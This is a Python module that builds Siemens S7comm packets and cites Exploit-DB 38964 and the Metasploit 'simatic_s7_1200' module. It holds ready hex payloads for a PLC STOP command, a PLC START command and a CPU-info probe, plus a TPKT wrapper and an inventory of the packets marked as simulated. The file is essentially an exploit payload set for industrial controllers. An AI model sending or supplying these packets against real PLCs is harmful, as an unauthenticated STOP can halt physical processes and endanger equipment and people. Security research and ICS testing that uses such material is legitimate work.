"""S7 packet builders — EDB 38964 / MSF simatic_s7_1200 inspired (MIT)."""

from __future__ import annotations

import struct
from typing import Any

# PLC STOP job PDU (simplified S7comm)
S7_STOP_HEX = "320100000400000008000000280000"

# PLC START job PDU
S7_START_HEX = "320100000400000008000000290000"

# S7-1200 GET_CPU_INFO style (COTP + setup + user data)
S7_1200_CPU_INFO_TEMPLATE = (
    "0300002402f080320100000800000008000000010012040111440100ff090001001200"
)


def build_stop_pdu() -> bytes:
    return bytes.fromhex(S7_STOP_HEX)


def build_start_pdu() -> bytes:
    return bytes.fromhex(S7_START_HEX)


def build_cpu_info_probe() -> bytes:
    return bytes.fromhex(S7_1200_CPU_INFO_TEMPLATE)


def packet_inventory() -> dict[str, Any]:
    return {
        "success": True,
        "simulate": True,
        "packets": {
            "stop": build_stop_pdu().hex(),
            "start": build_start_pdu().hex(),
            "cpu_info": build_cpu_info_probe().hex(),
        },
        "references": ["EDB-38964", "MSF simatic_s7_1200"],
    }


def wrap_tpkt(payload: bytes) -> bytes:
    return struct.pack(">BBH", 3, 0, len(payload) + 4) + payload
